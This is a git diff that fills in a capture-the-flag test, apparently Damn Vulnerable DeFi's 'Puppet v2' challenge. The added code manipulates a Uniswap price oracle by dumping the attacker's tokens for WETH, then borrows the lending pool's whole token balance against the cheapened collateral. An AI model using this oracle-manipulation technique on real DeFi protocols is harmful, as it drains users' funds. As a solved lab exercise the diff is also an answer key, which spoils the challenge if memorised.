@@ -82,6 +82,26 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+	const hackWeth = this.weth.connect(attacker);
+	const hackToken = this.token.connect(attacker);
+	const hackRouter = this.uniswapRouter.connect(attacker);
+	const hackLender = this.lendingPool.connect(attacker);
+
+	await hackToken.approve(hackRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+	await hackRouter.swapExactTokensForTokens(ATTACKER_INITIAL_TOKEN_BALANCE,ethers.utils.parseEther("9"), [hackToken.address, hackWeth.address],
+		attacker.address, (await ethers.provider.getBlock('latest')).timestamp * 2, );
+
+	const colateral = await hackLender.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+	await hackWeth.approve(hackLender.address,colateral);
+
+	const txParam = { to: hackWeth.address, value: ethers.utils.parseEther("19.9")};
+	await attacker.sendTransaction(txParam);
+
+	await hackLender.borrow(POOL_INITIAL_TOKEN_BALANCE, { gasLimit: 1e6 } );
+
+	
+	
+
     });
 
     after(async function () {
